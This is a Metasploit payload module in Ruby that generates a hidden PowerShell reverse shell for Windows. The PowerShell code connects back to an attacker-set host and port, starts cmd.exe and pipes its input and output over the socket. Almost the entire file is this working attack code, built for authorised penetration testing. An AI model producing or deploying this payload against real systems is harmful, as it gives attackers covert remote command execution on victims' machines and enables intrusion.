##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/find_shell'
require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module MetasploitModule

  CachedSize = 1228

  include Msf::Payload::Single
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Windows Command Shell, Reverse TCP (via Powershell)',
      'Description'   => 'Connect back and create a command shell via Powershell',
      'Author'        =>
        [
          'Dave Kennedy', # Original payload from trustedsec on SET
          'Ben Campbell' # Metasploit module
        ],
      'References'    =>
        [
          ['URL', 'https://github.com/trustedsec/social-engineer-toolkit/blob/master/src/powershell/reverse.powershell']
        ],
      # The powershell code is from SET, copyrighted by TrustedSEC, LLC and BSD licensed -- see https://github.com/trustedsec/social-engineer-toolkit/blob/master/readme/LICENSE
      'License'       => MSF_LICENSE,
      'Platform'      => 'win',
      'Arch'          => ARCH_CMD,
      'Handler'       => Msf::Handler::ReverseTcp,
      'Session'       => Msf::Sessions::CommandShell,
      'PayloadType'   => 'cmd',
      'RequiredCmd'   => 'powershell',
      'Payload'       =>
        {
          'Offsets' => { },
          'Payload' => ''
        }
      ))
  end

  #
  # Constructs the payload
  #
  def generate
    return super + command_string
  end

  #
  # Returns the command string to use for execution
  #
  def command_string
    lhost = datastore['LHOST']
    lport = datastore['LPORT']
    powershell = "function RSC{"\
          "if ($c.Connected -eq $true) {$c.Close()};"\
          "if ($p.ExitCode -ne $null) {$p.Close()};"\
          "exit;"\
        "};"\
        "$a='#{lhost}';$p='#{lport}';$c=New-Object system.net.sockets.tcpclient;"\
        "$c.connect($a,$p);$s=$c.GetStream();"\
        "$nb=New-Object System.Byte[] $c.ReceiveBufferSize;"\
        "$p=New-Object System.Diagnostics.Process;$p.StartInfo.FileName='cmd.exe';"\
        "$p.StartInfo.RedirectStandardInput=1;$p.StartInfo.RedirectStandardOutput=1;"\
        "$p.StartInfo.UseShellExecute=0;$p.Start();$is=$p.StandardInput;"\
        "$os=$p.StandardOutput;Start-Sleep 1;$e=new-object System.Text.AsciiEncoding;"\
        "while($os.Peek() -ne -1){"\
          "$o += $e.GetString($os.Read())"\
        "};"\
        "$s.Write($e.GetBytes($o),0,$o.Length);"\
        "$o=$null;$d=$false;$t=0;"\
        "while (-not $d) {"\
          "if ($c.Connected -ne $true) {RSC};"\
          "$pos=0;$i=1; "\
          "while (($i -gt 0) -and ($pos -lt $nb.Length)) {"\
            "$r=$s.Read($nb,$pos,$nb.Length - $pos);"\
            "$pos+=$r;"\
            "if (-not $pos -or $pos -eq 0) {RSC};"\
            "if ($nb[0..$($pos-1)] -contains 10) {break}};"\
            "if ($pos -gt 0){"\
              "$str=$e.GetString($nb,0,$pos);"\
              "$is.write($str);start-sleep 1;"\
              "if ($p.ExitCode -ne $null){RSC}else{"\
                "$o=$e.GetString($os.Read());"\
                "while($os.Peek() -ne -1){"\
                  "$o += $e.GetString($os.Read());"\
                  "if ($o -eq $str) {$o=''}"\
                "};"\
                "$s.Write($e.GetBytes($o),0,$o.length);"\
                "$o=$null;"\
                "$str=$null"\
              "}"\
            "}else{RSC}};"\

    "powershell -w hidden -nop -c #{powershell}"
  end
end
